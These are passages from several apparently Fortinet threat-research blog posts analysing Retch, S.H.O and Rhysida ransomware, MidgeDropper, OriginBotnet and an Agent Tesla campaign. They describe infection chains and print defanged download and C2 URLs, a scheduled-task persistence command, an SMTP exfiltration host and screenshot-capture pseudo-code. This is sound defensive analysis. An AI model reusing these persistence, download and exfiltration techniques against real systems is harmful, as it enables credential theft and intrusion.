.rwl, .raw, .raf, .orf, .nrw, .mrwref, .mef, .erf, .kdc, .dcr, .cr2, .crw, .bay, .sr2, .srf, .arw, .3fr, .dng, .jpe, .jpg, .cdr, .indd, .ai, .eps, .pdf, .pdd, .dbf, .mdf, .wb2, .rtf, .wpd, .dxg, .xf, .dwg, .pst, .accdb, .pptm, .xlk, .xlsb, .xlsm, .wps, .docm, .odb, .odc, .odm, .odp, .ods, .cs, .exe, .lnk, .mpeg, .mp3, .mkv, .divx, .ogg, .wav, .bat, .index, .flac, .vob, .mpg The following directories are excluded from file encryption: The ransomware adds a “.Retch” extension to encrypted files. It then drops a ransom note labeled \"Message.txt\" in every folder where files are encrypted. In the ransom note, the Retch attacker asks victims to pay Bitcoins worth 300 euros for file decryption. Due to the low ransom demand, Retch ransomware is likely used to target consumers rather than enterprises. As shown in Figure 2, the ransom message is available in French and English, leading us to believe that the Retch ransomware primarily targets French users. However, further investigation revealed that this isn't the case. We also discovered that the ransom note dropped on the Desktop differs from “Message.txt.” The ransom note left on the Desktop is labeled “HOW TO RECOVER YOUR FILES.txt” and asks victims to pay Bitcoin worth $1000 for file decryption. This ransom note has a different contact email address and includes the attacker’s Bitcoin wallet address. It turns out that the Retch ransomware was developed based on a publicly available ransomware source code that claims to be for educational purposes, which appears to be based on a well-known open-source ransomware, “HiddenTear.” The open-source ransomware has the ransom note shown in Figure 2 by default. The attacker appears to have only customized the ransom note on the desktop, which is only in English, leaving the ransom notes in all other locations untouched. This indicates that the Retch ransomware was not targeting French users as we first thought. As mentioned, the countries from which the files were submitted to the public file scanning service are widespread, further suggesting our suspicion is correct. At the time of our investigation, the attacker’s Bitcoin wallet had not recorded any transactions. Information about the infection vector used by the S.H.O ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. S.H.O ransomware samples have been submitted to a public file scanning service from the following countries: After the ransomware runs, it encrypts files on compromised machines and adds five random letters and numbers as a file extension. S.H.O attempts to encrypt files with the following extensions: .myd, .ndf, .qry, .sdb, .sdf, .tmd, .tgz, .lzo, .txt, .jar, .dat, .contact, .settings, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpg, .mka, .mhtml, .oqy, .png, .csv, .py, .sql, .indd, .cs, .mp3, .mp4, .dwg, .zip, .rar, .mov, .rtf, .bmp, .mkv, .avi, .apk, .lnk, .dib, .dic, .dif, .mdb, .php, .asp, .aspx, .html, .htm, .xml, .psd, .pdf, .xla, .cub, .dae, .divx, .iso, .7zip, .pdb, .ico, .pas, .db, .wmv, .swf, .cer, .bak, .backup, .accdb, .bay, .p7c, .exif, .vss, .raw, .m4a, .wma, .ace, .arj, .bz2, .cab, .gzip, .lzh, .tar, .jpeg, .xz, .mpeg, .torrent, .mpg, .core, .flv, .sie, .sum, .ibank, .wallet, .css, .js, .rb, .crt, .xlsm, .xlsb, .7z, .cpp, .java, .jpe, .ini, .blob, .wps, .docm, .wav, .3gp, .gif, .log, .gz, .config, .vb, .m1v, .sln, .pst, .obj, .xlam, .djvu, .inc, .cvs, .dbf, .tbi, .wpd, .dot, .dotx, .webm, .m4v, .amv, .m4p, .svg, .ods, .bk, .vdi, .vmdk, .onepkg, .accde, .jsp, .json, .xltx, .vsdx, .uxdc, .udl, .3ds, .3fr, .3g2, .accda, .accdc, .accdw, .adp, .ai, .ai3, .ai4, .ai5, .ai6, .ai7, .ai8, .arw, .ascx, .asm, .asmx, .avs, .bin, .cfm, .dbx, .dcm, .dcr, .pict, .rgbe, .dwt, .f4v, .exr, .kwm, .max, .mda, .mde, .mdf, .mdw, .mht, .mpv, .msg, .myi, .nef, .odc, .geo, .swift, .odm, .odp, .rar, .orf, .pfx, .p12, .pl, .pls, .safe, .tab, .vbs, .xlk, .xlm, .xlt, .xltm, .svgz, .slk, .tar.gz, .dmg, .ps, .psb, .tif, .rss, .key, .vob, .epsp, .dc3, .iff, .opt, .onetoc2, .nrw, .pptm, .potx, .potm,.pot, .xlw, .xps .xsd, .xsf, .xsl, .kmz, .accdr, .stm, .accdt, .ppam, .pps, .ppsm, .exe, .p7b, .wdb, .sqlite, .sqlite3, .dacpac, .zipx, .lzma, .z, .tar.xz, .pam, .r3d, .ova, .1c, .dt, .c, .vmx, .xhtml, .ckp, .db3, .dbc, .dbs, .dbt, .dbv, .frm, .mwb, .mrg, .txz, .mrg, .vbox, .wmf, .wim, .xtp2, .xsn, .xslt The following files are excluded in all directories: These directories are also excluded from having their contents encrypted: S.H.O encrypts each file using an RSA public key and the Microsoft “Rijndael Managed” C# library. Upon completing the encryption run, it replaces the Desktop wallpaper with its own that asks victims to find and read the file “readme.txt,” which is a ransom note. FortiGuard Labs has identified two S.H.O ransomware variants that leave different ransom notes. Although the ransom notes have different Bitcoin addresses belonging to the attacker, the ransom fee stays consistent at $200. The ransom messages have a very fearful and ominous tone that may be an attempt to scare victims into paying the ransom. Neither of the Bitcoin wallets was available at the time of our investigation. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Retch ransomware samples with the following AV signature: FortiGuard Labs detects the S.H.O ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack.

    "title": "New MidgeDropper Variant",
    "link": "https://www.fortinet.com/blog/threat-research/new-midgedropper-variant",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium One of the most exciting aspects of malware analysis is coming across a family that is new or rare to the reversing community. Determining the function of the malware, who created it, and the reasons behind it become a mystery to solve. The previously unseen dropper variant we recently found, named MidgeDropper, has a complex infection chain that includes code obfuscation and sideloading, making it an interesting use case. Although we couldn’t obtain the final payload, this blog will still explore what makes this dropper tick. The initial infection vector was not available to FortiGuard Labs at the time of our investigation. However, we strongly suspect it to be a phishing e-mail because we have access to an RAR archive—!PENTING_LIST OF OFFICERS.rar—that would have been the likely attachment to an e-mail. Two files are in the !PENTING_LIST OF OFFICERS.rar archive: “Notice to Work-From-Home groups.pdf” and “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” (Figure 1). The “Notice to Work-From-Home groups.pdf” file is exactly what it appears to be: a PDF file. It contains an image of an error message that falsely indicates that the PDF document failed to load. It is designed to act as a decoy and shift the recipient’s attention to clicking on and executing the “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file. Since file extensions are hidden by default in Windows, it is unlikely that anyone reviewing the contents would see the “.exe” and would instead assume they were opening another PDF file. At 6.7MB, the ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file is large by malware delivery standards. This executable primarily functions as a dropper for the following stages of infection. The executable drops the files “Microsoft Office.doc,” “IC.exe,” “power.exe,” and “power.xml”. It also reaches out to “hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe” to pull down the file “seAgnt.exe.” This file is dropped and opened from “C:\\Users\\<user>\\AppData\\Local\\Temp\\Microsoft\\Office.” It is also meant to be a decoy. It is populated in some versions of the dropper, but it was empty and benign in the version analyzed by FortiGuard Labs. “IC.exe” is dropped by “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” and deposited into “C:\\ProgramData\\Emisoft\\Microsoft\\Stream\\IC.exe.” It is responsible for obtaining the next stage of the infection. “IC.exe” reaches out to a URL at “185[.]225[.]68[.]37” to download an additional file, “VCRUNTIME140_1.dll.” As can probably be guessed by the filename, “VCRUNTIME140_1.dll” is meant to appear as a file related to the Microsoft Visual C++ Redistributable Package. “power.exe” is dropped along with “power.xml” by ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe”.  “power.exe” only has one job: decoding and processing “power.xml.” Figure 9 shows that “power.xml” in its native format is obfuscated and not readily readable.  This can be easily rectified by removing the garbage characters used for obfuscation. With obfuscation removed, an XML document remains. Much of the information is irrelevant except for the final section under the “Actions” tag. The primary purpose of this pair of files is to launch “seAgnt.exe.” “seAgnt.exe” is a renamed copy of “GameBarFTServer.exe,” which is an application published by Microsoft, “Xbox Game Bar Full Trust COM Server.”  It is a background process for the Xbox Game Bar that runs on Windows. Although itself benign, “seAgnt.exe” does depend on “VCRUNTIME140_1.dll”.  This dependency allows the malicious code inside of the DLL to execute. “VCRUNTIME140_1.dll” is a legitimate DLL that is part of the Microsoft Visual C++ runtime package. Unfortunately, the particular version used here is malicious. Due to “VCRUNTIME140_1.dll” being a Dynamic Link Library, it doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. “seAgnt.exe” is that application. This technique is called sideloading (https://attack.mitre.org/techniques/T1574/002/) because a dependency of a legitimate application is highjacked to allow the malicious code to load. The file is heavily obfuscated and designed to make analysis much more difficult. For example, the figure below shows the massive number of function jumps that attempt to hide the purpose of the code. The rest of the code makes it equally difficult to follow along in a disassembler. The primary purpose of the code appears to be reaching out to “hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat” to pull down the file “35g3498734gkb.dat”. Oddly, “35g3498734gkb.dat” is identical to “VCRUNTIME140_1.dll” in terms of the file hash, so it’s unclear why the threat actor opted to pull it down again from the C2 node. Unfortunately, further links on the infection chain were taken down when our analysis began, preventing further analysis of any potential final payloads. Despite the final payload being unavailable before FortiGuard Labs could analyze it, this dropper made an interesting case study and provided a subject to watch out for.

    "title": "OriginBotnet Spreads via Malicious Word Document",
    "link": "https://www.fortinet.com/blog/threat-research/originbotnet-spreads-via-malicious-word-document",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrencySeverity level:Critical In August, FortiGuard Labs obtained a Word document containing a malicious URL designed to entice victims to download a malware loader. This loader employs a binary padding evasion strategy that adds null bytes to increase the file's size to 400 MB. The payloads of this loader include OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft, and AgentTesla for harvesting sensitive information. Figure 1 illustrates the comprehensive attack flow. In this blog, we examine the various stages of how the file is deployed and delve into the specifics of the malware it delivers. Aphishingemail delivers the Word document as an attachment, presenting a deliberately blurred image and a counterfeit reCAPTCHA (Figure 2) to lure the recipient into clicking on it. Clicking activates an embedded malicious link in the file “\\word_rels\\document.xml.rels,” as shown in Figure 3. The initial loader was acquired from https://bankslip[.]info/document/scancop20233108[.]exe. This file, written in .NET, deciphers the “Main_Project” resource data in “HealthInstitutionSimulation.Properties.Resources.resources.” It uses an XOR operation with the string “WdxDFWxcf09WXfVVjLwKKcccwnawf” and then 'Activator.CreateInstance()' to execute the decoded information. The decoding procedure is shown in Figure 4. The second stage uses the “Main Project.dll” with the entry point illustrated in Figure 5. In this stage, the code initiates a “Sleep()” function within “Delation()” and establishes persistence through the “Moschop()” function. It then loads Base64-encoded strings and uses the AES-CBC algorithm for decryption, retrieving a PowerShell command, as shown in Figure 6. To ensure persistence, it duplicates the EXE file into the directory “%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” under the filename “audacity.exe.exe” to ensure that the file runs automatically even if the victim restarts their device. Following that, it employs the command “GetType(‘I.L’).GetMethod(‘U’)” to invoke a method from the DLL that was decrypted from the resources labeled “DataPresent.” This is passed to the third-stage payload, decrypted from the data within the resources labeled “Moss,” using the AES-ECB algorithm, as shown in Figure 7. The third stage uses “scancopper4647979413.exe,” which is another .NET executable file. It utilizes the “Activator.CreateInstance()” method to generate an instance decoded from the resources, “rumdisintegration.dat,” effectively triggering the execution of the fourth-stage file, “cargomind.dll.” It then uses the “CreateInstance()” method with two parameters: the object type for instantiation and an array of arguments to be transmitted to the created object. The fourth stage is represented by a DLL file, “cargomind.dll.” Its entry point is shown in Figure 9. It comprises three Base64-encoded strings intended for subsequent operations. The “Deserialize()” function, as shown in Figure 10, is responsible for decoding these strings, parsing the key-value pairs for each option, and ultimately returning a dictionary. Figure 11 displays the result obtained from “list2.” It reveals the existence of three tasks, each comprising six distinct options. Let's explore the options within “list2[0]” in detail: For the remaining two tasks in “list2,” the action is set to “b.” Consequently, it invokes the “ExecuteBinder()” function to decode data specified in the “r_k” option, as shown in Figure 14. The targeted files in this context are “newcrisp.dat” and “backyard.dat,” both sourced from the resources section of the prior stage, “scancopper46477979413.exe,” as shown in Figure 15. The initial malware originates from the URL https://softwarez[.]online/javau[.]exe. It is a .NET executable file that has been packed using SmartAssembly. Upon deciphering the resource data, we uncovered the ultimate payload, “RedLine Clipper,” as shown in Figure 16. RedLine Clipper (SHA256: 4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3), also known as ClipBanker, specializes in stealing cryptocurrencies by manipulating the user's system clipboard activities to substitute the destination wallet address with one belonging to the attacker. The compromised version (Figure 17) supports cryptocurrencies, including Bitcoin, Ethereum, Dogecoin, Litecoin, Dashcoin, and Monero. It continually monitors the clipboard for a copied coin wallet address, which is typically lengthy and complex, making manual entry impractical. When a wallet address is detected on the clipboard, RedLine Clipper covertly alters it to match the attacker's wallet address. Ordinarily, cryptocurrency wallet addresses adhere to specific formats, but due to their complexity, users often copy and paste them during transactions. Consequently, if the wallet address is tampered with at this stage, users intending to send funds to a particular wallet may inadvertently deposit them into the attacker's wallet instead. To carry out this operation, RedLine Clipper utilizes the “OnClipboardChangeEventHandler” to regularly monitor clipboard changes and verify if the copied string conforms to the regular expression depicted in Figure 18. It's worth noting that the attacker targets all six supported cryptocurrencies in this scheme. The second file, an Agent Tesla variant, is stored as “COPPER.exe” (SHA256: c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798). This malware can log keystrokes, access the host's clipboard, and conduct disk scans to uncover credentials and other valuable data. Further, it can transmit gathered information to its Command and Control (C2) server through various communication channels, including HTTP(S), SMTP, FTP, or even dispatching it to a designated Telegram channel. To ensure its persistence, the malware replicates itself to the location “%AppData%\\EbJgI\\EbJgI.exe” and establishes itself as an auto-run entry within the system registry, as shown in Figure 20. Additionally, it compiles a list of specific software installed on the victim's device, including web browsers, email clients, FTP clients, and more, as shown in Figure 21. This specific version of Agent Tesla employs SMTP as its C2 connection protocol. You can see the details of the traffic session in Figure 22. The third file, OriginBotnet, is stored as “david.exe” (SHA256: be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7). It is named after its namespace, as seen in Figure 23. OriginBotnet has a range of capabilities, including collecting sensitive data, establishing communications with its C2 server, and downloading additional files from the server to execute keylogging or password recovery functions on compromised devices. Initially, OriginBotnet scans running processes to determine if it is already active within the environment. It then initializes its settings and gathers essential information about the victim’s device, such as the installed AntiVirus Product, CPU, GPU, country, OS name, and username, as shown in Figure 25. Once the system information has been collected, the malware connects with the C2 server at https://nitrosoftwares[.]shop/gate. Figure 26 shows the function responsible for transmitting messages. The communication is conducted via a POST request using a parameter named “p.” The POST data is subjected to TripleDES encryption (in ECB mode, with PKCS7 padding) and subsequently encoded in Base64 format. The encryption key for TripleDES is stored within the “x-key” field of the HTTP Header. Additionally, the Content-Type and User-Agent values are hard-coded as “application/x-www-form-urlencoded” and “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0,” respectively. Figures 27 and 28 provide insights into the traffic capture and decrypted message. After receiving an “OK” signal from the C2 server, OriginBotnet enters a waiting state and proceeds to parse incoming C2 commands. The process for handling these commands is outlined in Figure 28. The available commands include “downloadexecute,” “uninstall,” “update,” and “load.” If the victim receives either the “downloadexecute” or “update” command, the malware proceeds to parse additional parameters, including the URL. It then directly downloads supplementary files from the specified URL and executes them. It selects the appropriate execution method depending on the file’s extension (.exe, .msi, or .java). This may involve using “Process.Start” or invoking commands such as “msiexec.exe /I” or “java.exe -jar,” as shown in Figure 30. When receiving an “uninstall” command, OriginBotnet invokes “MoveFile” to relocate the file to a temporary folder. The final command, “load,” retrieves plugins from the C2 server. The POST session and the decoded data for this specific request are displayed in Figure 31. In this context, two plugins are available for OriginBotnet: Keylogger and PasswordRecovery. The plugin DLL file is transmitted as a Base64 encoded string within the “bytes” parameter. The processing function for this operation is shown in Figure 32. The Keylogger plugin (SHA256: c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c5) is designed to covertly record and log each keystroke executed on a computer as well as monitor user activities. It employs techniques such as “SetWindowsHookEx” for capturing keyboard input events and “GetForegroundWindow” to determine the active window the user is working in. It also keeps tabs on clipboard text content through “SetClipboardViewer.” The stolen text file uses a format similar to Agent Tesla's, as shown in Figure 35. The PasswordRecovery plugin (SHA256: 56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67) retrieves and organizes the credentials of various browser and software accounts. It records these results and reports them via HTTP POST requests. Its primary function is shown in Figure 36. The plugin is designed to target the following browsers and software applications: This cyberattack campaign uncovered by FortiGuard Labs involved a complex chain of events. It began with a malicious Word document distributed via phishing emails, leading victims to download a loader that executed a series of malware payloads.

    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity level:Critical Our FortiGuard Labs captured a phishing campaign that spreads a new Agent Tesla variant. This well-known malware family uses a .Net-based Remote Access Trojan (RAT) and data stealer to gain initial access. It is often used for Malware-as-a-Service (MaaS). I performed an in-depth analysis of this campaign, from the initial phishing email to the actions of Agent Tesla installed on the victim’s machine to the collecting of sensitive information from the affected device. In this analysis, you will learn about the contents of this attack, such as how the phishing email starts the campaign, how the CVE-2017-11882/CVE-2018-0802 vulnerability (and not the VBS macro) is exploited to download and execute the Agent Tesla file on the victim’s device, as well as how Agent Tesla collects the sensitive data from the victim’s device, such as the credentials, key loggings, and screenshots of the victim’s screen. Despite fixes forCVE-2017-11882/CVE-2018-0802being released by Microsoft in November, 2017 and January, 2018, this vulnerability remains popular amongst threat actors, suggesting there are still unpatched devices in the wild, even after over five years. We are observing and mitigating3000 attacks per day, at the IPS level. The number of observed vulnerable devices isaround 1300per day. The phishing email is disguised as a Purchase Order notification, shown in Figure 1.1, that asks for the recipient to confirm an order from an industrial equipment supplier company. An Excel document is attached to this email called “Order 45232429.xls”. The attached Excel document is in OLE format. It contains crafted equation data that exploits the CVE-2017-11882/CVE-2018-0802 vulnerability to execute a malicious shellcode. Opening the attached Excel document displays a deceptive message to the user (Figure 2.1). Meanwhile, the shellcode inside the crafted equation data is secretly executed. CVE-2017-11882/CVE-2018-0802 is an RCE (remote code execution) vulnerability that results in memory corruption inside the EQNEDT32.EXE process when parsing the crafted equation data when exploited. This can lead to arbitrary code execution. Figure 2.2 shows the Excel document parsed in an OLE compound reader, where the equation data is inside the stream “\\x01Ole10NativE” under the storage folder “MBD0057E612”. Once the crafted Excel document is opened, the malicious equation data is parsed automatically by an MS Office process called “EQNEDT32.EXE.” This triggers the CVE-2017-11882/CVE-2018-0802 vulnerability, and the malicious shellcode inside the equation data is executed in the background. In Figure 2.3, we can see that the crafted equation data overrides the stack of the EQNEDT32.EXE and makes it jump twice (through the fixed addresses of 0x450650 and 0x44C329) to the shellcode at 0x33C006C (in the stack). After self-decryption, we observe that the shellcode’s main job is downloading and executing an additional malware file from the URL “hxxp://23[.]95.128.195/3355/chromium.exe”. To do this, it calls several APIs, such as URLDownloadToFileW(), to download the malware to a local folder, and ShellExecuteW() to run the malware on the victim’s device. In Figure 2.4, we can see that the shellcode is about to call the API URLDownloadToFileW() to download it into a local file and rename it as “dasHost.exe” under the “%TEMP%” folder. The downloaded file (“dasHost.exe”) is a .Net program protected by two packers, IntelliLock and .NET Reactor. Figure 3.1 displays the EntryPoint function of the downloaded file inside dnSpy, where the assembly name of the file is “Nvgqn7x”. As you may have noticed, all the names of the namespaces, classes, methods, and variables are thoroughly obfuscated. There are resource files inside the downloaded file’s .Net Resources section. The downloaded file (“dasHost.exe”) extracts two fileless execution modules from the .Net Resources section. One is the payload module of Agent Tesla, and the other is a Loader module to the payload file of Agent Tesla. Figure 3.2 shows all the resources in the .Net Resources section. According to my analysis, the resource \"rTMIRNhcvIYnT8lMa6.UJQcCvWAsvT8GV6hyn.resources\" is the encoded Loader module, whose assembly name is “Cassa.” The resource \"FinalProject.Resources\" is the encrypted and compressed Agent Tesla payload module, whose assembly name is “NyZELH bX.” It gets decrypted, decompressed, and loaded as a module in the “DeleteMC()” function of the Loader module, as shown in Figure 3.3. As you may have noticed, the resource is disguised as a Bitmap resource and is mixed up with the payload. Bitmap.GetPixel() and Color.FromArgb() are the two APIs being called to read the payload from the resource. It then goes through decryption and gzip decompression to restore the payload file, which is loaded as an executable module by calling the AppDomain.CurrentDomain.Load() method. Finally, the payload file’s “EntryPoint” function is invoked from the Loader module (“Cassa”). The payload module is a .Net program and is fully obfuscated. Fortunately, I managed to have it de-obfuscated using several analysis tools. As with most malware, the developers run the malware’s core module in a separate process. This is a common protection strategy to increase the malware's chance of survival on the victim's device. The primary function (other than persistence) of the payload is to perform the process hollowing and then place another decrypted executable file—sourced from a separate resource (called “7gQsJ0ugxz.resources”) within the payload file—onto the hollowed process and execute it. In this analysis, I call this decrypted executable file the core module of Agent Tesla. Figure 4.1 contains the key APIs the payload module invokes to perform the ProcessHollowing. It invokes CreateProcess() to create a suspended process of “dasHost.exe.” Next, it allocates memory in this process via the API VirtualAllocEx() for the core module. Then WriteProcessMemory() is invoked numerous times to copy the core module, saved in the array variable byte_1, onto the new process. It finally calls the APIs SetThreadContext() and ResumeThread() to restore the new process from a suspended state to execute the core module of Agent Tesla. After that, the payload module exits by calling Environment.Exit() in the Loader module’s DeleteMC() (refer to Figure 3.3). To persist in collecting the victim’s sensitive data, even if the affected system is restarted or the Agent Tesla process is killed, it does the following two things. It executes a command to create a task in the system TaskScheuler inside the payload module. The command in my analysis environment is \"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\kCqKCO\" /XML \"C:\\Users\\Bobs\\AppData\\Local\\Temp\\tmp68E9.tmp,\" where \"Updates\\kCqKCO\" is the task name and \"/XML\" specifies it’s been created from an XML file that is provided by following a parameter (i.e. tmp68E9.tmp). Figure 5.1 shows the details of the XML content, where the file “C:\\Users\\Bobs\\AppData\\Roaming\\kCqKCO.exe” is a duplication of the downloaded “dasHost.exe.” The task is set to start at the victim’s logon. The core module adds an auto-run item in the system registry“C:\\Users\\Bobs\\AppData\\Roaming\\sOFvE\\sOFvE.exe” (shown in Figure 5.2). It is another duplication of “dasHost.exe” that is launched automatically at system startup. The Agent Tesla core module collects sensitive information from the victim’s device. This information includes the saved credentials of some software, the victim’s keylogging information, and screenshots of the victim’s device. It steals saved credentials from specified software installed on the victim’s device, including web browsers, email clients, FTP clients and more. Based on their features, the affected software can be categorized as below: \"Opera Browser\", \"Yandex Browser\", \"Iridium Browser\", \"Chromium\", \"7Star\", \"Torch Browser\", \"Cool Novo\", \"Kometa\", \"Amigo\", \"Brave\", \"CentBrowser\", \"Chedot\", \"Orbitum\", \"Sputnik\", \"Comodo Dragon\", \"Vivaldi\", \"Citrio\", \"360 Browser\", \"Uran\", \"Liebao Browser\", \"Elements Browser\", \"Epic Privacy\", \"Coccoc\", \"Sleipnir 6\", \"QIP Surf\", \"Coowon\", \"Chrome\", \"Flock Browser\", \"QQ Browser\", \"IE/Edge\", \"Safari\", \"UC Browser\", \"Falkon Browser\". \"Outlook\", \"ClawsMail\", \"IncrediMail\", \"FoxMail\", \"eM Client\", \"Opera Mail\", \"PocoMail\", \"Windows Mail App\", \"Mailbird\", \"The Bat!\", \"Becky!\", \"Eudora\". \"Flash FXP\", \"WS_FTP\", \"FTPGetter\", \"SmartFTP\", \"FTP Navigator\", \"FileZilla\", \"CoreFTP\", \"FtpCommander\", \"WinSCP\". \"NordVPN\", \"Private Internet Access\", \"OpenVPN\", \"Discord\", \"Trillian\", \"Psi/Psi+\". \"Mysql Workbench\", \"\\Microsoft\\Credentials\\\", \"Internet Download Manager\", \"JDownloader\". Agent Tesla calls the API SetWindowsHookEx() to set a keyboard hook to monitor low-level input events. In Figure 6.2, the callback hook procedure “this.EiqpViCm9()” is called whenever the victim is typing on their device. Agent Tesla records the program title, time, and victim’s keyboard input contents into a local file “%Temp%/log.tmp” from time to time. It also has a method called by a Timer every 20 minutes to check the “log.tmp” file and submit its content via SMTP. In the core module, Agent Tesla sets another Timer with a 20-minute interval to call another Timer function. This Timer function checks for any activity on the device and determines whether to record the screenshot and submit it. To do this, it calls the API GetLastInputInfo() to retrieve the time of the last input event received by the system and then compare it with the current time. The following pseudo-code snippet illustrates how Agent Tesla captures a screenshot. bitmap = newBitmap(bounds.Width, Screen.PrimaryScreen.Bounds.Height);encoderParameters = new EncoderParameters(1);encoder = 25Tl1j7fiou.KIOsJnSv3(ImageFormat.Jpeg);EncoderParameter encoderParameter = newEncoderParameter(Encoder.Quality, (long)Convert.ToInt32(60L));encoderParameters.Param[0] = encoderParameter;graphics = Graphics.FromImage(bitmap);graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);bitmap.Save(memoryStream, encoder, encoderParameters); The “memoryStream” variable saves the screenshot in jpeg format. Agent Tesla provides multiple ways to submit the stolen data, such as using the HTTP POST method or as the body of an email over SMTP. This variant chooses to submit the data collected from the victim’s device over email SMTP protocol. The SMTP server address and port hardcoded in the variant are \"mail.daymon.cc\" and 587. Figure 7.1 shows the malware about to call the smtpClient.Send() function to submit credentials data. The email subject starts with the keyword “PW_” followed by the User name/Computer name for credentials data. The email body is formatted in HTML. It is shown in Figure 7.2 when parsing the email body as HTML in a browser. The email’s subject is “KL_{User name/Computer name},” where KL is short for keylogger, and the email body is the collected keylogging data. As displayed in Figure 7.3, the email body includes the records of my keystrokes typed in a Notepad titled “Untitled - Notepad.” The captured screenshot is kept in a variable and added as an email attachment when submitted to the attacker. Figure 7.4 shows it about to add screenshot data to the email as an attachment. The email subject format for ScreenShots is “SC_{User name/Computer name},” and the email body is just the basic information about the victim’s device. The following flowchart roughly describes the outline of the malicious campaign. This analysis shows that a malicious Excel document attached to a phishing email exploits an aging security vulnerability to execute a shellcode that downloads Agent Tesla. It keeps relevant modules encrypted and encoded in the Resource section to protect its core module from being analyzed. I then explained how this variant establishes persistence on the victim’s device. I also showed the kind of software and data Agent Tesla is able to steal from the infected device, including credentials, keylogging data, and active screenshots. Lastly, I provided several examples of the kind of sensitive data this variant of Agent Tesla obtained from my analysis environment and how this stolen sensitive data is submitted to the attacker via emails over SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached Excel document and the downloaded file with AV signatures “MSExcel/CVE_2017_11882.EQMA!exploit” and “MSIL/AgentTesla.BEDA!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Rhysida ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Rhysida ransomware is a new ransomware group that uses aRansomware-as-a-Service (RaaS)model consisting of developers who create and provide ransomware, the infrastructure needed to operate it, and affiliates who execute attacks against victims. Its first ransomware sample was submitted to a public file scanning service in May 2023. On August 4, 2023, the Health Sector Cybersecurity Coordination Center (HC3)releaseda sector alert for the Rhysida ransomware. According to the HC3 alert, Rhysida threat actors rely on phishing attacks as an infection vector. The attackers also reportedly use Cobalt Strike for lateral movement within the victim's network and to deliver payloads. Cobalt Strike is advertised as an adversary emulation tool for information security professionals to evaluate network and system defenses. However, cybercriminals often abuse it to compromise networks and create persistent communication channels between the attacker and the victim. The leak site used by the Rhysida group to auction and expose victim data currently lists 41 victims. While Rhysida has hit organizations around the globe, more than 50% of affected organizations are located in Europe, with North America a distant second. Organizations in Asia Pacific (APAC), Latin America, the Middle East, and Africa were also affected. The education sector accounts for more than 30% of its victims—with one exception, all of the affected organizations in the education sector are located in Europe and North America—followed by manufacturing, government, and IT. According to information on the data leak site, the largest amount of data (1.6 TB) was stolen from a European government agency. After compromising the victim’s network, Rhysidia likely deploys Cobalt Strike to move laterally across the network and function as its command and control center. The ransomware finds and encrypts data using the ChaCha algorithm, adding a “.rhysida” extension to the affected files. Rhysida ransomware avoids encrypting files that have the following file extensions: It also avoids encrypting files in the following folders: One of the earlier Rhysida ransomware samples 